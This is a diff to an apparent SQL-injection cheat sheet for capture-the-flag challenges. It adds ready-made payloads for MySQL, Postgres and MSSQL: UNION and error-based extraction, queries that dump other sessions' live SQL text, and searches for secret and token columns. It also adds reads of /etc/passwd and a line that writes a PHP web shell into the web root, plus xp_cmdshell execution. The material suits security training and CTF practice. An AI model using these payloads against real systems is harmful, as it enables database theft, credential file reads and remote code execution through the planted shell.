@@ -23,8 +23,7 @@
 ## Recon
 
 ```sql
-
-# testing payloads
+-- quote probes
 '
 "
 `
@@ -34,51 +33,98 @@
 '))
 "))
 `))
-​
-# comments
-MySQL
-#comment
--- comment     [Note the space after the double dash]
+
+-- comments
+# mysql
+-- comment
 /*comment*/
-/*! MYSQL Special SQL */
+/*!50000 SELECT 1*/
 
-PostgreSQL
---comment
+-- postgres / sqlite / mssql
+-- comment
 /*comment*/
-
-MSQL
---comment
-/*comment*/
-
-Oracle
---comment
-
-SQLite
---comment
-/*comment*/
-
-HQL
-HQL does not support comments# comments
-
 ```
 
-<pre class="language-sql"><code class="lang-sql">
-<strong># postgres, mysql
-</strong>1. schema_name FROM information_schema.schemata - ambil database
-2. table_name/GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='ZZZ' LIMIT 1 OFFSET 0 - ambil table
-3. column_name FROM information_schema.columns WHERE table_name='ZZZ' - ambil column
-​
-## Special
-FROM information_schema.processlist # ambil process yg dijalankan
-​
-# sqlite
-0. select sqlite_version();
-1. SELECT sql FROM sqlite_schema / sql FROM sqlite_master
-2. SELECT tbl_name FROM sqlite_master WHERE type='table' / SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
-3. a. SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name'
-   b. SELECT GROUP_CONCAT(name) FROM pragma_table_info('table_name');
+## Schema
 
-</code></pre>
+```sql
+-- sqlite
+SELECT sqlite_version();
+SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%';
+SELECT sql FROM sqlite_master WHERE type='table';
+SELECT group_concat(name) FROM pragma_table_info('table_name');
+
+-- mysql / postgres
+SELECT schema_name FROM information_schema.schemata;
+SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database();
+SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users';
+
+-- postgres
+SELECT current_database();
+SELECT version();
+```
+
+## System Tables / Live Queries
+
+Use when normal schema extraction is blocked, the flag is hidden in SQL comments, or another request/session contains useful query text.
+
+```sql
+-- mysql: current and historical-ish query text, if privilege/config allows it
+SELECT id,user,host,db,command,time,state,info FROM information_schema.processlist;
+SELECT group_concat(info SEPARATOR 0x0a) FROM information_schema.processlist WHERE info IS NOT NULL;
+SELECT group_concat(info SEPARATOR 0x0a) FROM information_schema.processlist WHERE info LIKE '%flag%' OR info LIKE '%CBC{%';
+
+-- mysql: comments embedded in live queries may show up in info
+SELECT info FROM information_schema.processlist WHERE info LIKE '%/*%' OR info LIKE '%--%';
+
+-- mysql/performance_schema
+SELECT group_concat(sql_text SEPARATOR 0x0a) FROM performance_schema.events_statements_current;
+SELECT group_concat(sql_text SEPARATOR 0x0a) FROM performance_schema.events_statements_history;
+
+-- postgres: live queries
+SELECT datname,usename,client_addr,state,query FROM pg_stat_activity;
+SELECT string_agg(query, chr(10)) FROM pg_stat_activity WHERE query IS NOT NULL;
+SELECT string_agg(query, chr(10)) FROM pg_stat_activity WHERE query LIKE '%flag%' OR query LIKE '%CBC{%';
+
+-- mssql: running requests and SQL text
+SELECT text FROM sys.dm_exec_requests CROSS APPLY sys.dm_exec_sql_text(sql_handle);
+SELECT text FROM sys.dm_exec_cached_plans CROSS APPLY sys.dm_exec_sql_text(plan_handle);
+```
+
+High-value metadata:
+
+```sql
+-- mysql
+SELECT user(),current_user(),database(),@@version,@@hostname,@@secure_file_priv;
+SELECT grantee,privilege_type FROM information_schema.user_privileges;
+SELECT table_schema,table_name,column_name FROM information_schema.columns WHERE column_name LIKE '%flag%' OR column_name LIKE '%secret%' OR column_name LIKE '%token%';
+
+-- postgres
+SELECT current_user,current_database(),version();
+SELECT rolname,rolsuper,rolcreaterole,rolcreatedb FROM pg_roles;
+SELECT table_schema,table_name,column_name FROM information_schema.columns WHERE column_name ILIKE '%flag%' OR column_name ILIKE '%secret%' OR column_name ILIKE '%token%';
+
+-- mssql
+SELECT SYSTEM_USER,USER_NAME(),DB_NAME(),@@version;
+SELECT name FROM sys.databases;
+SELECT table_name,column_name FROM information_schema.columns WHERE column_name LIKE '%flag%' OR column_name LIKE '%secret%' OR column_name LIKE '%token%';
+```
+
+File read / write checks:
+
+```sql
+-- mysql
+SELECT LOAD_FILE('/etc/passwd');
+SELECT LOAD_FILE('/flag');
+SELECT '<?php system($_GET[0]); ?>' INTO OUTFILE '/var/www/html/s.php';
+
+-- postgres, superuser only
+SELECT pg_read_file('/etc/passwd');
+SELECT pg_ls_dir('/');
+
+-- mssql, if enabled
+EXEC xp_cmdshell 'whoami';
+```
 
 ## Union Extract
 
@@ -101,6 +147,8 @@ FROM information_schema.processlist # ambil process yg dijalankan
 ' UNION SELECT 1,database(),3-- -
 ' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -
 ' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -
+' UNION SELECT 1,group_concat(info SEPARATOR 0x0a),3 FROM information_schema.processlist-- -
+' UNION SELECT 1,LOAD_FILE('/flag'),3-- -
 ```
 
 ## Non-SELECT Context
@@ -141,6 +189,23 @@ ASC, (SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END)
 
 -- mssql time
 ';IF(ASCII(SUBSTRING((SELECT TOP 1 flag FROM secret),1,1))>77) WAITFOR DELAY '0:0:2'--
+```
+
+## Error-Based Payloads
+
+```sql
+-- mysql
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database()),0x7e),1)-- -
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))-- -
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
+
+-- postgres
+' AND CAST((SELECT current_database()) AS int) IS NULL-- -
+' AND 1=CAST((SELECT string_agg(table_name, ',') FROM information_schema.tables) AS int)-- -
+
+-- mssql
+' AND 1=CONVERT(int,(SELECT DB_NAME()))--
+' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sys.tables))--
 ```
 
 ## WAF Bypass
@@ -236,6 +301,8 @@ print("Final:", flag)
 ```
 
 ### Time-Based Blind SQLi Threaded Extractor
+
+Only use threads if the target handles concurrent requests independently. If the app queues per session/IP, use one worker or the timing oracle will lie.
 
 ```python
 import requests
